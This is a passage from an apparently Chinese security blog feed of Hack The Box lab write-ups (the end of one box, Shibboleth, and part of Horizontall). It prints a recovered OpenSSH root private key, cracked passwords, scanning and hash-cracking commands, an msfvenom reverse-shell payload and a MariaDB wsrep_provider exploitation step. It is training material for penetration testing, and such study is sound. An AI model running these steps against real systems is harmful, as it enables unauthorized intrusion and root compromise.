class="string">&quot;\n%s&quot;</span>, summary);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> path[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> res;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">path_s</span>;</span></span><br><span class="line">    <span class="keyword">char</span> summary[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter source file/directory name: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%99s&quot;</span>, path);</span><br><span class="line">    getchar();</span><br><span class="line">    stat(path, &amp;path_s);</span><br><span class="line">    <span class="keyword">if</span>(S_ISDIR(path_s.st_mode))</span><br><span class="line">        dircount(path, summary);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        filecount(path, summary);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// drop privs to limit file write</span></span><br><span class="line">    setuid(getuid());</span><br><span class="line">    <span class="comment">// Enable coredump generation</span></span><br><span class="line">    prctl(PR_SET_DUMPABLE, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Save results a file? [y/N]: &quot;</span>);</span><br><span class="line">    res = getchar();</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">121</span> || res == <span class="number">89</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Path: &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%99s&quot;</span>, path);</span><br><span class="line">        FILE *fp = fopen(path, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (fp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">fputs</span>(summary, fp);</span><br><span class="line">            fclose(fp);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Could not open %s for writing\n&quot;</span>, path);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述代码是指在代码中启用核心转储，这有助于分析崩溃转储，因此我们需要获取两个shell，具体参考资料<a href="https://man7.org/linux/man-pages/man2/prctl.2.html">https://man7.org/linux/man-pages/man2/prctl.2.html</a>。我们首先先运行这个count文件，并输入相对应的参数值，目的是获取到root的ssh密钥<br><img src="https://img-blog.csdnimg.cn/646aaa231c9849b0b991774b4b2542ad.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们在另一个终端上结束这个进程，它会生成一个日志文件。通过使用 apport-unpack 我们可以轻松调试程序的崩溃。所有的崩溃数据都存储在转储目录下，CoreDump 有我们需要的信息。<br><img src="https://img-blog.csdnimg.cn/12396e7ff8884666860801df4d99273f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAn6zLlm7QOGGZytUCO3SNpR5vdDfxNzlfkUw4nMw/hFlpRPaKRbi3</span><br><span class="line">KUZsBKygoOvzmhzWYcs413UDJqUMWs+o9Oweq0viwQ1QJmVwzvqFjFNSxzXEVojmoCePw+</span><br><span class="line">7wNrxitkPrmuViWPGQCotBDCZmn4WNbNT0kcsfA+b4xB+am6tyDthqjfPJngROf0Z26lA1</span><br><span class="line">xw0OmoCdyhvQ3azlbkZZ7EWeTtQ/EYcdYofa8/mbQ+amOb9YaqWGiBai69w0Hzf06lB8cx</span><br><span class="line">8G+KbGPcN174a666dRwDFmbrd9nc9E2YGn5aUfMkvbaJoqdHRHGCN1rI78J7rPRaTC8aTu</span><br><span class="line">BKexPVVXhBO6+e1htuO31rHMTHABt4+6K4wv7YvmXz3Ax4HIScfopVl7futnEaJPfHBdg2</span><br><span class="line">5yXbi8lafKAGQHLZjD9vsyEi5wqoVOYalTXEXZwOrstp3Y93VKx4kGGBqovBKMtlRaic+Y</span><br><span class="line">Tv0vTW3fis9d7aMqLpuuFMEHxTQPyor3+/aEHiLLAAAFiMxy1SzMctUsAAAAB3NzaC1yc2</span><br><span class="line">EAAAGBAJ+sy5Zu0DhhmcrVAjt0jaUeb3Q38Tc5X5FMOJzMP4RZaUT2ikW4tylGbASsoKDr</span><br><span class="line">85oc1mHLONd1AyalDFrPqPTsHqtL4sENUCZlcM76hYxTUsc1xFaI5qAnj8Pu8Da8YrZD65</span><br><span class="line">rlYljxkAqLQQwmZp+FjWzU9JHLHwPm+MQfmpurcg7Yao3zyZ4ETn9GdupQNccNDpqAncob</span><br><span class="line">0N2s5W5GWexFnk7UPxGHHWKH2vP5m0Pmpjm/WGqlhogWouvcNB839OpQfHMfBvimxj3Dde</span><br><span class="line">+GuuunUcAxZm63fZ3PRNmBp+WlHzJL22iaKnR0RxgjdayO/Ce6z0WkwvGk7gSnsT1VV4QT</span><br><span class="line">uvntYbbjt9axzExwAbePuiuML+2L5l89wMeByEnH6KVZe37rZxGiT3xwXYNucl24vJWnyg</span><br><span class="line">BkBy2Yw/b7MhIucKqFTmGpU1xF2cDq7Lad2Pd1SseJBhgaqLwSjLZUWonPmE79L01t34rP</span><br><span class="line">Xe2jKi6brhTBB8U0D8qK9/v2hB4iywAAAAMBAAEAAAGAGkWVDcBX1B8C7eOURXIM6DEUx3</span><br><span class="line">t43cw71C1FV08n2D/Z2TXzVDtrL4hdt3srxq5r21yJTXfhd1nSVeZsHPjz5LCA71BCE997</span><br><span class="line">44VnRTblCEyhXxOSpWZLA+jed691qJvgZfrQ5iB9yQKd344/+p7K3c5ckZ6MSvyvsrWrEq</span><br><span class="line">Hcj2ZrEtQ62/ZTowM0Yy6V3EGsR373eyZUT++5su+CpF1A6GYgAPpdEiY4CIEv3lqgWFC3</span><br><span class="line">4uJ/yrRHaVbIIaSOkuBi0h7Is562aoGp7/9Q3j/YUjKBtLvbvbNRxwM+sCWLasbK5xS7Vv</span><br><span class="line">D569yMirw2xOibp3nHepmEJnYZKomzqmFsEvA1GbWiPdLCwsX7btbcp0tbjsD5dmAcU4nF</span><br><span class="line">JZI1vtYUKoNrmkI5WtvCC8bBvA4BglXPSrrj1pGP9QPVdUVyOc6QKSbfomyefO2HQqne6z</span><br><span class="line">y0N8QdAZ3dDzXfBlVfuPpdP8yqUnrVnzpL8U/gc1ljKcSEx262jXKHAG3mTTNKtooZAAAA</span><br><span class="line">wQDPMrdvvNWrmiF9CSfTnc5v3TQfEDFCUCmtCEpTIQHhIxpiv+mocHjaPiBRnuKRPDsf81</span><br><span class="line">ainyiXYooPZqUT2lBDtIdJbid6G7oLoVbx4xDJ7h4+U70rpMb/tWRBuM51v9ZXAlVUz14o</span><br><span class="line">Kt+Rx9peAx7dEfTHNvfdauGJL6k3QyGo+90nQDripDIUPvE0sac1tFLrfvJHYHsYiS7hLM</span><br><span class="line">dFu1uEJvusaIbslVQqpAqgX5Ht75rd0BZytTC9Dx3b71YYSdoAAADBANMZ5ELPuRUDb0Gh</span><br><span class="line">mXSlMvZVJEvlBISUVNM2YC+6hxh2Mc/0Szh0060qZv9ub3DXCDXMrwR5o6mdKv/kshpaD4</span><br><span class="line">Ml+fjgTzmOo/kTaWpKWcHmSrlCiMi1YqWUM6k9OCfr7UTTd7/uqkiYfLdCJGoWkehGGxep</span><br><span class="line">lJpUUj34t0PD8eMFnlfV8oomTvruqx0wWp6EmiyT9zjs2vJ3zapp2HWuaSdv7s2aF3gibc</span><br><span class="line">z04JxGYCePRKTBy/kth9VFsAJ3eQezpwAAAMEAwaLVktNNw+sG/Erdgt1i9/vttCwVVhw9</span><br><span class="line">RaWN522KKCFg9W06leSBX7HyWL4a7r21aLhglXkeGEf3bH1V4nOE3f+5mU8S1bhleY5hP9</span><br><span class="line">6urLSMt27NdCStYBvTEzhB86nRJr9ezPmQuExZG7ixTfWrmmGeCXGZt7KIyaT5/VZ1W7Pl</span><br><span class="line">xhDYPO15YxLBhWJ0J3G9v6SN/YH3UYj47i4s0zk6JZMnVGTfCwXOxLgL/w5WJMelDW+l3k</span><br><span class="line">fO8ebYddyVz4w9AAAADnJvb3RAbG9jYWxob3N0AQIDBA==</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
<p>我们拿到ssh的root密钥后，就可以尝试连接root用户了<br><img src="https://img-blog.csdnimg.cn/b2efd44d61e04cbfad3fe15f865131fe.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个靶机还是相当出色的一个靶机，它主要考查了代码审计的能力，代码包含了js，c这些高级的编程语言，前期拿取webshell主要考查了js前端的代码审计能力，后期提权是核心转储，这个要求真的很高了，这个靶机我觉得应该设置为Medium难度，但是它确实Easy，有点意外。</p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>Shibboleth</title>
    <url>/2022/01/13/Shibboleth/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>只做一个简单的扫描，发现只开放了web服务<br><img src="https://img-blog.csdnimg.cn/97c60e806c6d413eb3524efdf5cbdb9c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/19faecaea42a449ba7cf1bc2244db896.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>fuzz了一下路径，并没有发现任何有价值的路径信息<br><img src="https://img-blog.csdnimg.cn/7d1c7ad510a74a089d925f6c3b674ead.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<span id="more"></span>

<p>我们将思路转换到子域名挖掘上，发现了三个子域，我们将它们逐一访问的时候发现都同时指向同一个登录页面</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wfuzz -c -u <span class="string">&quot;http://shibboleth.htb&quot;</span> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 26 -H <span class="string">&quot;HOST:FUZZ.shibboleth.htb&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/520287b9831e4eafa7e8f56cb80b2463.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/5cd36cb1f22d4ffc97f718b00a6170eb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>我们对这个表单进行SQL注入漏洞的检测时，并没有发现存在注入，也没有发现对应的中间件漏洞，到这里我的思路断了。我在反思它是个靶场肯定是有漏洞点的，可能是我信息收集那块做得不够细致。因此我对靶场进行UDP端口的扫描，查看是否存在漏扫的地方。扫描时发现开放了623端口的asf-rmcp服务<br><img src="https://img-blog.csdnimg.cn/8d6296236bc149bb9e96a7c0219733f9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<!--more-->

<p>在搜索引擎上搜索时，发现了对应的漏洞利用复现。漏洞利用的方式是使用MSF框架的对应模块进行漏洞的检测<br><img src="https://img-blog.csdnimg.cn/c1bceb8bee654c4d82f8bd3ecd59c2a9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/53abaaec2bdc4593a1cc5de0b865f47e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>设置好对应的参数后，发现IPMI的版本是2.0<br><img src="https://img-blog.csdnimg.cn/5430d56678624006bcb42e414ff0a16e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那我们可以尝试使用下载哈希的模块，尝试能否将用户对应的hash值下载下来。我们发现对应的管理员的哈希值，我们可以将哈希值保存下来，使用hashcat进行密码破解，因为对应的加密方式是IPMI，因此我们可以筛选一下<img src="https://img-blog.csdnimg.cn/8ddb20fb646844cb8c2c59c9be1da693.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>对应的编号是7300，解密出来的密码是<code>ilovepumkinpie1</code>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 7300 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/9d0ed66d101f41c593497ac9adc49a27.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/8bba274825dc42cba553281a16464f09.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们可以拿这个账号密码登录进zabbix的管理员页面<br><img src="https://img-blog.csdnimg.cn/85d21ce1938d44168a00a9fbfc97ee33.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>查阅对应的漏洞复现文章发现，在Configuration的hosts处，可以添加对应的脚本，实现RCE漏洞的执行<br><img src="https://img-blog.csdnimg.cn/aa4967975c894ae188bd13955e787130.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/99a13f40d5a6484dac50075d8cf77c10.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/b9ceff97b59546599dedd240624fca25.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们在key处添加我们要执行的RCE代码内容，点击添加并执行，期间我们开启对应的监听端口，可以反弹一个shell到本地终端上<br><img src="https://img-blog.csdnimg.cn/89a3911aa36b420887970de69515048e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/c0622899df61434e924f6d2b2b2ab3b2.png" alt="在这里插入图片描述"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们确实是获得了一个终端，但是并没有权限查看到user.txt的内容，我们得想办法提权到ipmi-svc这个账户的权限上<br><img src="https://img-blog.csdnimg.cn/b4b5288c956948ba9dd4b917f5396c02.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们下意识可以尝试，使用Administrator账户的密码看看是否能成功。令人很意外的是，居然成功了<br><img src="https://img-blog.csdnimg.cn/586fc07ad39344f8858fd00d7dbdb3d1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那下一步就是拿取root权限了，我上传了个linpeas.sh脚本到目标主机上进行检查，但是并没有发现任何有价值的信息。但是我们查看本地的端口时，发现开放了mysql服务<br><img src="https://img-blog.csdnimg.cn/1cabb3c6e28b43f5a42c5b3bb9d2e9c8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们进入到zabbix的目录上，筛选信息发现了数据库的密码为<code>bloooarskybluh</code>，用户名为<code>zabbix</code><br><img src="https://img-blog.csdnimg.cn/2423387ead4747a28f952d7b47bab881.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/c46ad8d982584668af369bfe0217eb1c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们尝试登录到数据库上，数据库的版本为<code>10.3.25</code><br><img src="https://img-blog.csdnimg.cn/c99b6814e5f94d5796ef64db705d2fe9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我尝试过搜寻数据库中对应账户的密码进行解密，但是都无功而返。切换一种思路，我搜寻到了mysql对应版本的漏洞信息。文章中说明了这个版本的mysql存在RCE漏洞<br><img src="https://img-blog.csdnimg.cn/88dd5b53214b46a1b29cf0f8250eadfd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我在github上找到一个漏洞利用的脚本，这是链接<a href="https://github.com/Al1ex/CVE-2021-27928">https://github.com/Al1ex/CVE-2021-27928</a><br><img src="https://img-blog.csdnimg.cn/11fbc233c5ad4caa848e064466e57189.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>根据提示来，我们先生成一个对应的payload，再开启监听反弹一个root的shell到本地上</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.30 LPORT=4445 -f elf-so -o payload.so</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/ba5f1d4ea3274eadaa72fd212301296f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后把payload文件上传到目标主机上<br><img src="https://img-blog.csdnimg.cn/d37c053a543346549047aa87a86b4409.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>最后登录到mysql里，执行这么一段指令<code>SET GLOBAL wsrep_provider=&quot;/tmp/payload.so&quot;;</code>，获得root权限<br><img src="https://img-blog.csdnimg.cn/cab9ce62d2c54b2d8ef5236665166e5d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个靶机还是相当出色的，首先一般的扫描只能扫描到80的web服务，因为web服务最多就只能发掘到子域的登录表单上，之后就断思路了。所以还得扫描UDP的端口，这个就不是特别多人能够想得到，进行登录操作后，又得考验对zabbix的RCE漏洞利用，这个要求也比较高，然后再到root的提权上，很充分地考查了对中间件安全的知识，总体来说这是一个相当出色的靶机。</p>
]]></content>
      <categories>
        <category>中间件</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>Horizontall</title>
    <url>/2022/01/09/Horizontall/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>目标主机只开放了ssh和web服务<br><img src="https://img-blog.csdnimg.cn/c6ea98b32b994a8f8a0cf9c759db1cee.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们直接访问web服务，发现是一个正常的网页，扫描目录也没有发现有价值的信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u <span class="string">&quot;http://horizontall.htb/&quot;</span> -w /usr/share/seclists/Discovery/Web-Content/common.txt -e 404,500 -t 50</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/f6b30b44e96d409f934b299e104245eb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<span id="more"></span>

<p>那我们将注意力转移到子域名上，对子域名进行深入挖掘，发现了一个子域名，那么我们可以实施旁站注入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster vhost -u http://horizontall.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 100</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2cf9c69827e84e87b9616816c817376d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>访问这个页面时发现使用的是<code>strapi</code>这个CMS<br><img src="https://img-blog.csdnimg.cn/3724c08fac2d427f80427e762141b930.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<!--more-->

<p>我们依照这个路径进行路径的扫描，发现存在一个admin目录，我们访问发现会跳转到登录表单上</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u <span class="string">&quot;http://api-prod.horizontall.htb/&quot;</span> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e 404,500 -t 50</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/19c0c71aaef14180949dead326bc5c37.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>尝试了一遍SQL注入，发现不存在SQL注入的问题。那我们转向中间件漏洞这个方向上，在EDB上查找到存在一个密码重置的RCE漏洞<br><img src="https://img-blog.csdnimg.cn/fd1458a74a574a918911ef0a1ae87cfe.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/acf1f0e8aea34dacb917647d4ee1f190.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们编辑为一个exp文件，并执行它获取到一个用户交互的shell终端。这里显示用户名和密码是<code>admin:SuperStrongPassword1</code><br><img src="https://img-blog.csdnimg.cn/d93aa5dc52404922aadb13f884d33ccf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>登录进页面发现存在文件上传点，但是这个并不能进行文件上传getshell<br><img src="https://img-blog.csdnimg.cn/8b81cd2146e843a5941549c0bfe46564.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们发现这个EXP是存在RCE命令执行的功能的，那我们可以在交互终端上进行反弹一个shell给我们<br><img src="https://img-blog.csdnimg.cn/88522af59e4e42d2bd77c449691c2e62.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们将linpeas.sh脚本下载到目标机器上，尝试看看有没有存在提权的突破点<br><img src="https://img-blog.csdnimg.cn/a7e43564181146d0b3e82efaac54674a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>运行脚本后，但是我们并没有发现任何可提权的点，但是我们查看主机运行的端口可以发现，主机的1337端口正在以root身份运行程序，由于我们用nmap无法扫描出该端口，可以推断主机做了内网端口的转发。<br><img src="https://img-blog.csdnimg.cn/0638be03f2764c3f9db143944921a40f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们可以使用frp进行内网的端口复用，首先先将<code>frpc</code>和<code>frpc.ini</code>上传到目标主机上，上传成功后设置好我们本机的ip地址和要转发本地端口和远程端口<br><img src="https://img-blog.csdnimg.cn/5b03de7f59a043c887497c243c893d3d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>在目标机器和本机上分别开启监听服务<br><img src="https://img-blog.csdnimg.cn/28bf83b3599646c89714b357a407787f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后我们访问本机的8000端口，发现是一个由Laravel框架搭建起来的网页程序<br><img src="https://img-blog.csdnimg.cn/8581ba2866b940708a56f715327a7152.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>这个应用程序近年发现一个存在RCE的漏洞，在github上可以搜到对应的EXP漏洞利用脚本，并执行可见漏洞利用成功<br><a href="https://github.com/LucifielHack/CVE-2021-3129_exploit">https://github.com/LucifielHack/CVE-2021-3129_exploit</a><br><img 